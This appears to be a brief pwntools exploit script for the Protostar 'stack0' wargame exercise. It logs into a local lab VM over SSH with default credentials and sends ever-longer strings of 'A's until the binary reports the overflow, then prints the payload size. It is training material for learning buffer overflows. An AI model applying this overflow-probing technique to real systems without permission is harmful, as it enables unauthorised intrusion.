
from pwn import *



#  IP OF THE VM 192.168.160.128
# location of the binary /opt/protostar/bin/stack0

r = ssh(host='192.168.160.128', user='user', password='user')

payload=b'A'
counter=1
response=''
while "you have" not in response :
    my_prog = r.run(['/opt/protostar/bin/stack0'])
    my_prog.sendline(payload)
    response = (my_prog.recvline()).decode()
    
    payload+=b'A'
    counter+=1
    my_prog.close()


print(response)
print("payload size : ", counter)